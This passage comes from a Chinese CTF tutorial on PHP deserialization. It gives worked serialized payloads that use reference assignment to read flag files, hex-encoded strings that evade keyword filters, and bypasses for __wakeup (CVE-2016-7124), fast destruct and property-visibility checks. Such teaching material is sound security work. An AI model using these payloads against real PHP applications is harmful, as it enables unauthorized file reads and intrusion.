       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```

**分析:**

根据题目我们可以得知，这里涉及到了 MD5 弱类型比较问题，经过 MD5 弱类型比较之后，会进行反序列化。

下面我们来看类中的关键代码:

```
php

class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}
```

可以看到，我们需要反序列化 `BUU` 类，同时 `$this->correct = base64_encode(uniqid());`，而需要我们通过反序列化修改 `input` 属性的值达到与 `corrent` 属性（随机生成的值）一致。才会输出 FLAG。

而 `uniqid()` 函数则用于生成一个唯一 ID。效果大概如下:

[![alt text](https://image.3001.net/images/20240325/1711368752_66016a30dc04f74488ca2.png)](https://image.3001.net/images/20240325/1711368752_66016a30dc04f74488ca2.png)

可以发现该函数的前缀是一样的，是因为它获取一个带前缀、基于当前时间微秒数的唯一 ID。由于我们执行时间差不多，故而一样，但是后面是随机的十六进制，故而暴破可能性基本没有。

那么我们该如何给赋值 `input` 让其等于 随机生成的 `uniqid()`，其实在 PHP 中是支持引用赋值的。例如:

[![alt text](https://image.3001.net/images/20240325/1711368757_66016a3554278c11a1105.png)](https://image.3001.net/images/20240325/1711368757_66016a3554278c11a1105.png)

[![alt text](https://image.3001.net/images/20240325/1711368761_66016a3946976de10cf44.png)](https://image.3001.net/images/20240325/1711368761_66016a3946976de10cf44.png)

那么我们只需要将 `input` 属性的值引用自 `correct` 属性即可。

**构造序列化:**

```
php

<?php 
class BUU {
   public $correct = "";
   public $input = "";

   public function __construct() {
        $this->input = & $this->correct; // 值引用
   }
//    public function __destruct() {
//        try {
//            $this->correct = base64_encode(uniqid());
//            if($this->correct === $this->input) {
//                echo file_get_contents("/flag");
//            }
//        } catch (Exception $e) {
//        }
//    }
   
}

echo serialize(new BUU); 
// O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
?>
```

**利用:**
[![alt text](https://image.3001.net/images/20240325/1711368766_66016a3ee96acf759d733.png)](https://image.3001.net/images/20240325/1711368766_66016a3ee96acf759d733.png)

关于 MD5 弱类型如果不理解请参考: https://www.qwesec.com/2024/02/ctfweb-md5.html

#### 例题 - 2

选自: [蓝帽杯 2020 第四届 线上赛] Soitgoes

```
php

<?php
highlight_file(__FILE__);
class Seri{
    public $alize;
    public function __construct($alize) {
        $this->alize = $alize;
    }
    public function __destruct(){
        $this->alize->getFlag();
    }
}

class Flag{
    public $f;
    public $t1;
    public $t2;

    function __construct($file){
        $this->f = $file;
        $this->t1 = $this->t2 = md5(rand(1,10000));
    }

    public function getFlag(){
        $this->t2 = md5(rand(1,10000));
        echo $this->t1;
        echo $this->t2;
        if($this->t1 === $this->t2)
        {
            if(isset($this->f)){
                echo @highlight_file($this->f,true);
            }
        }
    }
}
if (isset($_GET['ser'])) {
    unserialize($_GET['ser']);
}
```

**分析:**

- 我们要执行的目标为 `Flag` 类下的 `getFlag()` 方法。
- 寻找可以调用 `Flag` 类下的 `getFlag()` 方法的类：发现为 `Seri` 类的
  `alize` 属性赋值为 `Flag` 类生成的对象，即可触发 getFlag () 方法。

我们来看下 `getFlag()` 方法的代码:

```
php
public function getFlag(){
    $this->t2 = md5(rand(1,10000));
    echo $this->t1;
    echo $this->t2;
    if($this->t1 === $this->t2)
    {
        if(isset($this->f)){
            echo @highlight_file($this->f,true);
        }
    }
}
```

可以看到，需要 `t1` 和 `t2` 的值完全相等并且为 `f` 属性赋值为想要读取的文件名称 `flag.php` 即可得到 FLAG。

但是由于 `t2` 的属性值为 随机数 `1-10000` 之间随机生成的值并进行 MD5 加密之后的结果。由于是万分之一可能性，所以我们假设 `t2` 属性为一个值并进行暴破。

不过我们有更好的解决方法，那就是使用值引用。

**构造序列化:**

```
php

<?php
class Seri{
    public $alize;
}

class Flag{
    public $f;
    public $t1;
    public $t2;

    function __construct(){
        $this->t1 = & $this->t2;
    }
}

$s = new Seri;
$flag = new Flag;
$s->alize = $flag;
$flag->f = 'flag.php';
echo serialize($s);
// O:4:"Seri":1:{s:5:"alize";O:4:"Flag":3:{s:1:"f";s:8:"flag.php";s:2:"t1";N;s:2:"t2";R:4;}}
```

利用:

[![alt text](https://image.3001.net/images/20240325/1711368774_66016a462f6a62f06e773.png)](https://image.3001.net/images/20240325/1711368774_66016a462f6a62f06e773.png)

如果使用暴破进行做题也可以，假设随机到的值为 5000，那么我们就构造如下，这里就不贴序列化用的代码了，直接看序列化值:

```
php
O:4:"Seri":1:{s:5:"alize";O:4:"Flag":3:{s:1:"f";s:8:"flag.php";s:2:"t1";s:32:"a35fe7f7fe8217b4369a0af4244d1fca";s:2:"t2";N;}}
```

接着使用 burp 抓包发到 `Intruder` 模块即可，大概在 1929 次数据包之后得到了 FLAG。

[![alt text](https://image.3001.net/images/20240325/1711368778_66016a4a7226894ecee78.png)](https://image.3001.net/images/20240325/1711368778_66016a4a7226894ecee78.png)

### 反序列化特性及绕过方法

#### 关键字过滤

```
php

<?php 
class BUU {
    public $file = "index.php";
    public function __destruct() {
        if (isset($this->file) && !stripos('flag', $this->file))  {
            highlight_file($this->file);
        }
    }
}

if (isset($_GET['ser'])) {
    unserialize($_GET['ser']);
} else {
    $o = new BUU;
}
?>
```

通过代码来看这是一道很简单的反序列化题目，但是由于过滤了 `flag.php` 导致我们无法直接使用 `flag.php` 关键字。

我们先按照常规构造 EXP:

```
php

<?php 
class BUU {
    public $file = "index.php";
    // public function __destruct() {
    //     if (isset($this->file) && !stripos('flag', $this->file))  {
    //         highlight_file($this->file);
    //     }
    // }
}

$o = new BUU;
$o->file = 'flag.php';
echo serialize($o);  
// O:3:"BUU":1:{s:4:"file";s:8:"flag.php";}
?>
```

在反序列化值类型中，如果值类型为大写的 `S`，则先进行解码，那么我们只需要将 `flag.php` 按照一定规则编码即可：先将每个字符转为十进制的 ASCII 码，再将其转为十六进制即可。

编写 Python 代码:

```
python
s = 'flag.php'
result = ''
for i in s:
	result += hex(ord(i))

print(result.replace('0x','\\')) # \66\6c\61\67\2e\70\68\70
```

最终构造:

```
php
O:3:"BUU":1:{s:4:"file";S:8:"\66\6c\61\67\2e\70\68\70";}
```

[![alt text](https://image.3001.net/images/20240325/1711368784_66016a50cf8df6fba9101.png)](https://image.3001.net/images/20240325/1711368784_66016a50cf8df6fba9101.png)

#### 绕过__wakeup

**CVE-2016-7124**: 当成员属性数目大于实际数目时可绕过 `wakeup` 方法的执行

影响版本:

PHP5: < 5.6.25
PHP7: < 7.0.10

常规反序列化:

[![alt text](https://image.3001.net/images/20240325/1711368789_66016a558780358a5a54a.png)](https://image.3001.net/images/20240325/1711368789_66016a558780358a5a54a.png)

利用 CVE-2016-7124 的反序列化:

[![alt text](https://image.3001.net/images/20240325/1711368793_66016a59810f753276fc6.png)](https://image.3001.net/images/20240325/1711368793_66016a59810f753276fc6.png)

例题: [极客大挑战 2019] PHP 1 BUUCTF 平台可开环境

Writeup: [https://www.qwesec.com/2023/11/buuctfWeb.html#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-CVE-2016-7124](https://www.qwesec.com/2023/11/buuctfWeb.html#前置知识-CVE-2016-7124)

这种方法也叫做**畸形序列化字符串**，畸形序列化字符串就是故意修改序列化数据，使其与标准序列化数据存在个别字符的差异，达到绕过一些安全函数的目的。

#### 快速析构

**快速析构的原理**: 当 `php` 接收到畸形序列化字符串时，PHP 由于其容错机制，依然可以反序列化成功。 但是，由于你给的是一个畸形的序列化字符串，总之他是不标准的，所以 PHP 对这个畸形序列化字符串 得到的对象不放心，于是 PHP 就要赶紧把它清理掉，那么就触发了他的析构方法 `__destruct()`。

**应用场景**: 某些题目需要利用 `__destruct` 才能获取 flag，但 `__destruct` 是在对象被销毁时才触发 (执行顺序太靠后)， `__destruct` 之前会执行过滤函数，为了绕过这些过滤函数，就需要提前触发 `__destruct` 方法。

**畸形字符串的构造**:

- 改掉属性的个数
- 删除末尾的 `}`

**示例**:

常规序列化:

[![alt text](https://image.3001.net/images/20240325/1711368802_66016a62ec88821f9ceb6.png)](https://image.3001.net/images/20240325/1711368802_66016a62ec88821f9ceb6.png)

畸形序列化字符串:

[![alt text](https://image.3001.net/images/20240325/1711368807_66016a6720a722479b98b.png)](https://image.3001.net/images/20240325/1711368807_66016a6720a722479b98b.png)

#### PHP7.1 对属性权限不敏感

**特性**: php>7.1 版本对类属性的检测不严格 (对属性类型不敏感)

先看 PHP 7.1 以下的版本，对类属性的权限是敏感的:

[![alt text](https://image.3001.net/images/20240325/1711368838_66016a86d49215d8c4202.png)](https://image.3001.net/images/20240325/1711368838_66016a86d49215d8c4202.png)

而我们来看 PHP 7.1 以上的版本，对类属性的权限是不敏感的:

[![alt text](https://image.3001.net/images/20240325/1711368811_66016a6b9c5e78e424a7a.png)](https://image.3001.net/images/20240325/1711368811_66016a6b9c5e78e424a7a.png)

例题：网鼎杯 2020 青龙组 AreUSerialz BUUCTF 平台可开环境

---

## 相关资源

- **靶场WP**: [ctfshow-反序列化WP](WP汇总/CTfshow-反序序列化wp.md)
- **脚本**: [python-Pickle序列化脚本](CTF常用脚本及工具/python-Picke序列化/) — Pickle反序列化利用
- **文件包含**: [文件包含.md](文件包含.md) — phar伪协议触发反序列化
- **代码审计**: [php代码审计.md](php代码审计.md) — 魔术方法/变量覆盖审计